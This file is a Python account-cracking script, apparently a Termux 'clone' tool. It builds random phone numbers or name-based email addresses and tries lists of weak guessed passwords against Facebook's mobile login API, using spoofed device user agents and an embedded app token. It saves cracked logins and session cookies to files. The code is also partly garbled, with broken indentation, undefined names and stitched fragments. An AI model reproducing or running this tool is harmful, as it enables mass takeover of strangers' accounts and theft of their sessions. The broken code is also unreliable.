import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
logo =(""" \033[1;92m
RRRRRR  IIIII MM    MM  OOOOO  NN   NN 
RR   RR  III  MMM  MMM OO   OO NNN  NN 
RRRRRR   III  MM MM MM OO   OO NN N NN 
RR  RR   III  MM    MM OO   OO NN  NNN 
RR   RR IIIII MM    MM  OOOO0  NN   NN
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ [✓] AUTHOR    \033[1;91m : \033[1;92mRIMON AHMED           ┃
┃ [✓] TOOL      \033[1;91m  : \033[1;92mRANDOM CLONE               ┃
┃ [✓] STATUS    \033[1;91m : \033[1;92mFREE                       ┃
┃ [✓] SYSTEM    \033[1;91m : \033[1;92mDATA & WIFI                ┃
┃ [✓] TOOL UPDATE \033[1;91m: \033[1;92m    0.1
┃ [✓] GITHUB    \033[1;91m : \033[1;92m        RIMON-143     ┃
┃ [✓] FACEBOOK  \033[1;91m : \033[1;92m        MD RIMON           ┃
┃ [✓] WHATSAPP  \033[1;91m : \033[1;92m      016********       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Rimon =input(" [?] Choose : ")
        #os.system('xdg-open https://www.facebook.com/creative.mind004')
        if Rimon in ["1", "01"]:
            num()
        if Rimon in ["2","02"]:
            gml()
        if Rimon in [" 0", "00"]:
            exit()
        else:
            exit()
 def ph():
    user=[]
    os.system('clear')
    print(logo)
    print(f'{G}EXAMPLE : +63923, +63927, +63928 ')
    linex()
    code = input(f'{G}SIM CODE: ')
    linex()
    try:
        limit = int(input(f'{G}PUT LIMIT: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as ZARI:     
        os.system('clear')
        print(logo)
        
        tl = str(len(user))
        print(f'{G}LIMIT: '+tl)
        print(f'{G}SIM CODE: '+code)
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx,ids,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            ZARI.submit(rndm,ids,passlist)
    print('\033[1;37m')
    linex()
    print('THE PROCESS HAS COMPLETED')
    print('TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input('PRESS ENTER TO BACK ')
    main()           
    
def warlee():
    and_ver = str(random.randrange(9,12))
    app_ver = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver1 = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver_code = str(random.randint(111111111,999999999))
    app_ver_code1 = str(random.randint(111111111,999999999))
    model = random.choice(["CPH2411", "CPH2423", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2447", "CPH2449", "CPH2451", "CPH2399", "CPH2401", "CPH2381", "CPH2409", "CPH2459", "CPH2477", "CPH2471", "CPH1923", "CPH1837", "CPH1803", "CPH1853", "CPH1809", "CPH1931", "CPH1933", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2133", "CPH2139", "CPH2135", "CPH2303", "CPH2387", "CPH2407", "CPH2385", "CPH1901", "CPH1905", "CPH2067", "CPH2219", "CPH2339", "CPH2483", "CPH2495", "CPH1937", "CPH1941", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH1920", "CPH1903", "CPH1705fw", "CPH1605", "OPPO CPH1605", "CPH1605fw", "CPH1609", "CPH1609fw", "CPH1613", "CPH1613fw", "CPH1701", "CPH1701fw", "CPH1705", "CPH1707", "CPH1707fw", "CPH1715", "CPH1717", "CPH1719", "CPH1721", "CPH1723", "CPH1725", "CPH1727", "CPH1729", "CPH1801", "CPH1803", "CPH1805", "CPH1807", "CPH1808", "CPH1827", "CPH1851", "CPH1853", "CPH1893", "CPH1893", "CPH1903", "CPH1907", "CPH1909", "CPH1938", "CPH1989", "CPH2001", "CPH2015", "CPH2021", "CPH2031", "CPH2043", "CPH2071", "CPH2073", "CPH2077", "CPH2081", "CPH2083", "CPH2095", "CPH2109", "CPH2113", "CPH2145", "CPH2159", "CPH2161", "CPH2173", "CPH2179", "CPH2185", "CPH21859", "CPH2195", "CPH2197", "CPH2201", "CPH2207", "CPH2211", "CPH2213", "CPH2219", "CPH2223", "CPH2235", "CPH2237", "CPH2239", "CPH2241", "CPH2247", "CPH2249", "CPH2251", "CPH2263", "CPH2269", "CPH2271", "CPH2273", "CPH2275", "CPH2293", "CPH2309", "CPH2325", "CPH2365", "CPH2421", "CPH2455", "CPH2457", "CPH2461", "CPH2473", "CPH1911", "CPH1913", "CPH1915", "CPH1969", "CPH1987", "CPH2119", "CPH2285", "CPH1819", "CPH1821", "CPH1823", "CPH1825", "CPH1881", "CPH2437", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2009", "CPH2025", "CPH2173", "CPH2307", "CPH2305", "CPH1955", "CPH2137", "CPH2321", "CPH2385", "CPH2197", "CPH2341", "CPH2199", "CPH2201", "CPH2237", "CPH2363", "CPH2371", "CPH2371", "CPH2353", "CPH2343", "CPH2343", "CPH2363", "CPH2359", "CPH2357", "CPH1835", "CPH1831", "CPH1833", "CPH1833", "CPH1879", "CPH1877", "CPH1607", "CPH1607fw", "CPH1611", "CPH1917", "CPH1917", "CPH1921", "CPH1919", "CPH1919RU", "CPH1919", "CPH1921", "CPH1907", "CPH2065", "CPH1983", "CPH1979", "CPH1979", "CPH1945", "CPH1951", "CPH2043", "CPH2013", "CPH2009", "CPH2035", "CPH2036", "CPH2037", "CPH2091", "CPH2209", "CPH2125", "CPH2089", "CPH2089", "CPH2159", "CPH2217", "CPH2205", "CPH2343", "CPH2505", "CPH1859", "CPH1861"])
    model1 = random.choice(["Infinix_X689F", "Infinix_X682B", "Infinix_X682C", "Infinix_X657B", "Infinix_X688B", "Infinix_X688C", "Infinix_X657B", "Infinix_X658B", "Infinix_X658E", "Infinix_X659", "Infinix_X659B", "Infinix_X662", "Infinix_X662B", "Infinix_X689F", "Infinix_X675", "Infinix_X6812", "Infinix_X665", "Infinix_X665B", "Infinix_X510", "Infinix_X6827", "Infinix_X665C", "Infinix_X665E", "Infinix_HOT 3 Pro", "Infinix-X554", "Infinix_HOT 3 LTE", "Infinix_HOT 3 LTE", "Infinix_HOT 4", "Infinix_HOT4 LTE", "Infinix_HOT 4", "Infinix_X557", "Infinix_HOT 4", "Infinix_HOT 4", "Infinix_HOT 4 Lite", "Infinix_HOT 4 Pro", "Infinix_X556_LTE", "Infinix_HOT 4 Pro", "Infinix_HOT 4 Pro", "Infinix_X606", "Infinix_X606B", "Infinix_X606C", "Infinix_X606D", "Infinix_X608", "Infinix_X624", "Infinix_X624B", "Infinix_X625B", "Infinix_X625D", "Infinix_X650B", "Infinix_X650C", "Infinix_X650D", "Infinix_X650", "Infinix-X551", "Infinix_X688B", "Infinix_X688C", "Infinix_X573", "Infinix_X573S", "Infinix_X573B", "Infinix_X622", "Infinix_X559C", "Infinix_X559F", "Infinix_X559", "Infinix_HOT 4", "Infinix_HOT 4 Pro", "Infinix_X657B", "Infinix_X689", "Infinix_X689B", "Infinix_X689D", "Infinix_X689C", "Infinix_PR652B", "Infinix_PR652C", "Infinix_X6812B", "Infinix_X6817", "Infinix_X668", "Infinix_X668C", "Infinix_X6816C", "Infinix_X6816D", "Infinix_X6826", "Infinix_X6826B", "Infinix_X6826C", "Infinix_X6835", "Infinix_X6835B", "Infinix_X669", "Infinix_X669C", "Infinix_X669D", "Infinix_X623", "Infinix_X623B", "Infinix_X625C", "Infinix_X625C", "Infinix_X655", "Infinix_X655C", "Infinix_X655D", "Infinix_X680", "Infinix_X680B", "Infinix_X680C", "Infinix_X680E", "Infinix_X680F", "Infinix_X655F", "Infinix_X693", "Infinix_X663B", "Infinix_X693", "Infinix_X663C", "Infinix_X676C", "Infinix_X671", "Infinix_X676B", "Infinix_X671B", "Infinix_X6819", "Infinix_X6833B", "Infinix_X604", "Infinix_X604B", "Infinix_X605", "Infinix_X656", "Infinix_X604", "Infinix_X604B", "Infinix_X680", "Infinix_X680D", "Infinix_X6515", "Infinix_X6516", "Infinix_X5010", "Infinix_X510", "Infinix_X559", "Infinix_X571", "Infinix_X572", "Infinix_X6821", "Infinix_X6815B", "Infinix_X687B", "Infinix_X6811B", "Infinix_X6810", "Infinix_X6811", "Infinix_X687", "Infinix_X663", "Infinix_X695", "Infinix_X695C", "Infinix_X695D", "Infinix_X697", "Infinix_X698", "Infinix_X670", "Infinix_X676B", "Infinix_X672", "Infinix_X677", "Infinix_NOTE 3", "Infinix_NOTE 3 Pro", "Infinix_NOTE 3 Pro", "Infinix_X601_LTE", "Infinix_X572", "Infinix_X572-LTE", "Infinix_X571", "Infinix_X571-LTE", "Infinix_X690", "Infinix_X690B", "Infinix_X690C", "Infinix_X692", "Infinix_X683", "Infinix_X683B", "Infinix_X610B", "Infinix_X454", "Infinix_X455", "Infinix_S2", "Infinix_S2 Pro", "Infinix_X626", "Infinix_X626B", "Infinix_X626B LTE", "Infinix_X652", "Infinix_X652A", "Infinix_X652B", "Infinix_X652C", "Infinix_X660", "Infinix_X660B", "Infinix_X660C", "Infinix_X657", "Infinix_X657B", "Infinix_X657C", "Infinix_X6511", "Infinix_X657B", "Infinix_X6511", "Infinix_X6511B", "Infinix_X6511E", "Infinix_X6512", "Infinix_X6511G", "Infinix_X6823", "Infinix_X6823C", "Infinix_X6517", "Infinix_X612", "Infinix_X612B", "Infinix_X511", "Infinix_X5515", "Infinix_X5515F", "Infinix_X5515I", "Infinix_X609", "Infinix_X609B", "Infinix_X5514D", "Infinix_X5516", "Infinix_X5516B", "Infinix_X5516C", "Infinix_X627", "Infinix_X627V", "Infinix_X627W", "Infinix_X653", "Infinix_X653C", "Infinix_X405", "Infinix_X505", "Infinix_HOT S", "Infinix-X521", "Infinix-X521-LTE", "Infinix_X521", "Infinix-X521", "Infinix-X521", "Infinix_X521", "Infinix_X521_LTE", "Infinix-X521", "Infinix_X521", "Infinix_X521", "Infinix_HOT S", "Infinix-X521", "Infinix_X521", "Infinix-X521", "Infinix-X521_LTE", "Infinix_X521", "Infinix-X521S", "Infinix_X521S", "Infinix_Zero 3", "Infinix-X552", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 4", "Infinix_HOT 4", "Infinix_X572", "Infinix_X572-LTE", "Infinix-X600", "Infinix-X600-LTE", "Infinix_X6815", "Infinix_X6815C", "Infinix_X6815D", "Infinix_X6820", "Infinix_X6811", "Infinix_X509", "Infinix_Zero 4", "Infinix_Zero 4 Plus", "Infinix_X603", "Infinix_X603", "Infinix_X603-LTE", "Infinix_X620B", "Infinix_X620", "Infinix_X6515"])
    sim = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    sim1 = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    density = random.choice(["1.5","2.0","3.0"])
    width = random.choice(["540","720","1080"])
    height = str(random.randrange(999,2480))
    density1 = random.choice(["1.5","2.0","3.0"])
    width1 = random.choice(["540","720","1080"])
    height1 = str(random.randrange(999,2480))
    user_agent = f"[FBAN/FB4A;FBAV/"+str(app_ver)+";FBBV/"+str(app_ver_code)+";FBDM/"+"{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/en_US;FBCR/"+str(sim)+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(model)+";FBSV/"+str(and_ver)+";FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/315.0.0.47.113;FBPN/com.facebook.katana;FBLC/en_US;FBBV/285966838;FBCR/Android;FBMF/Genymotion;FBBD/Android;FBDV/Xiaomi Redmi Note 7;FBSV/9;FBCA/x86:null;FBDM/{density=2.625,width=1080,height=2214};FB_FW/1;FBRV/287051585;]'
    user_agents.append(f'"{user_agent}"')
    return user_agent
    
def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rndm():
    def rndm(ids,passlist):
    global loop
    global oks
    sys.stdout.write('\r\r\033[1;37m(YUJI-CRACKING) %s | \033[1;32mOK: %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers=  {'User-Agent': warlee(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r\033[1;32m[YUJI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    open('/sdcard/YUJI-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                    open('/sdcard/YUJI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[1;31m[YUJI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                    open('/sdcard/YUJI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)        
    except Exception as e:
        pass
YUJI()